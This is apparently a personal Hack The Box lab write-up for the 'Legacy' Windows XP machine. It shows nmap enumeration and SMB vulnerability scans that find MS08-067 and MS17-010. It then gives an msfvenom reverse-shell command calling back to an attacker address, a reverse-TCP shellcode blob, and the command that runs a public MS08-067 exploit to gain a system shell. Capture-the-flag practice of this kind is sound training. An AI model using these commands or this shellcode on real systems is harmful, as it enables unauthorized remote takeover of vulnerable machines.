# Legacy Walkthrough

## Enumeration
Initial nmap scan:
```
# Nmap 7.93 scan initiated Thu May 18 22:20:32 2023 as: nmap -Pn -n -p- -sC -sV -oN initial 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b97cbd (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-05-24T07:18:42+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 18 22:21:13 2023 -- 1 IP address (1 host up) scanned in 40.24 seconds
```
Further enumeration on the inital scan:
```
# Nmap 7.93 scan initiated Thu May 18 22:25:28 2023 as: nmap -Pn -n -sV -p 135,139,445 --script smb-enum* -oN smb_enum 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.028s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.4\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 18 22:26:02 2023 -- 1 IP address (1 host up) scanned in 33.82 seconds
```
## Finding vulnerabilities
Scanning for vulnerabilities:
```
# Nmap 7.93 scan initiated Thu May 18 22:27:02 2023 as: nmap -Pn -n -sV -p 135,139,445 --script smb-vuln* -oN smb_vuln 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.023s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 18 22:27:14 2023 -- 1 IP address (1 host up) scanned in 12.79 seconds
```
Decided to use the MS08-067 vulnerability. I used andyacer's exploit which can be found at https://github.com/andyacer/ms08_067/.

I used msfvenom to generate an executeable that will be used in the exploit.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
```

This part will be different if you get Python3 to work with the exploit.
Modified the shell code a bit for Python2.7 and ended up with something to the following:
```
# Reverse TCP to 10.11.0.157 port 62000:
shellcode=(
    "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
    "\x5e\x81\x76\x0e\xb1\xa9\x87\xbd\x83\xee\xfc"
    "\xe2\xf4\x4d\x41\x05\xbd\xb1\xa9\xe7\x34\x54"
    "\x98\x47\xd9\x3a\xf9\xb7\x36\xe3\xa5\x0c\xef"
    "\xa5\x22\xf5\x95\xbe\x1e\xcd\x9b\x80\x56\x2b"
    "\x81\xd0\xd5\x85\x91\x91\x68\x48\xb0\xb0\x6e"
    "\x65\x4f\xe3\xfe\x0c\xef\xa1\x22\xcd\x81\x3a"
    "\xe5\x96\xc5\x52\xe1\x86\x6c\xe0\x22\xde\x9d"
    "\xb0\x7a\x0c\xf4\xa9\x4a\xbd\xf4\x3a\x9d\x0c"
    "\xbc\x67\x98\x78\x11\x70\x66\x8a\xbc\x76\x91"
    "\x67\xc8\x47\xaa\xfa\x45\x8a\xd4\xa3\xc8\x55"
    "\xf1\x0c\xe5\x95\xa8\x54\xdb\x3a\xa5\xcc\x36"
    "\xe9\xb5\x86\x6e\x3a\xad\x0c\xbc\x61\x20\xc3"
    "\x99\x95\xf2\xdc\xdc\xe8\xf3\xd6\x42\x51\xf6"
    "\xd8\xe7\x3a\xbb\x6c\x30\xec\xc1\xb4\x8f\xb1"
    "\xa9\xef\xca\xc2\x9b\xd8\xe9\xd9\xe5\xf0\x9b"
    "\xb6\x56\x52\x05\x21\xa8\x87\xbd\x98\x6d\xd3"
    "\xed\xd9\x80\x07\xd6\xb1\x56\x52\xed\xe1\xf9"
    "\xd7\xfd\xe1\xe9\xd7\xd5\x5b\xa6\x58\x5d\x4e"
    "\x7c\x10\xd7\xb4\xc1\x8d\xb7\xbf\xa4\xef\xbf"
    "\xb1\xa8\x3c\x34\x57\xc3\x97\xeb\xe6\xc1\x1e"
    "\x18\xc5\xc8\x78\x68\x34\x69\xf3\xb1\x4e\xe7"
    "\x8f\xc8\x5d\xc1\x77\x08\x13\xff\x78\x68\xd9"
    "\xca\xea\xd9\xb1\x20\x64\xea\xe6\xfe\xb6\x4b"
    "\xdb\xbb\xde\xeb\x53\x54\xe1\x7a\xf5\x8d\xbb"
    "\xbc\xb0\x24\xc3\x99\xa1\x6f\x87\xf9\xe5\xf9"
    "\xd1\xeb\xe7\xef\xd1\xf3\xe7\xff\xd4\xeb\xd9"
    "\xd0\x4b\x82\x37\x56\x52\x34\x51\xe7\xd1\xfb"
    "\x4e\x99\xef\xb5\x36\xb4\xe7\x42\x64\x12\x67"
    "\xa0\x9b\xa3\xef\x1b\x24\x14\x1a\x42\x64\x95"
    "\x81\xc1\xbb\x29\x7c\x5d\xc4\xac\x3c\xfa\xa2"
    "\xdb\xe8\xd7\xb1\xfa\x78\x68"
)
```
## Exploitation
Run the exploit.
```
python2.7 ms08_067_2018_2.7.py 10.10.10.4 6 445 
```
I was running into compatibility issues so I modified andyacer's exploit to run in Python2.7 since Python3 requires different formatting through out the exploit. Porting to 2.7 would require less changes to the exploit.

After some trial and error, I was able to get the system shell and grab both credentials.
[<img height="200" width="200px" src="https://github.com/zmiddle/htb/blob/main/legacy/legacy_pwned.png" />](https://www.hackthebox.com/achievement/machine/259690/2) 
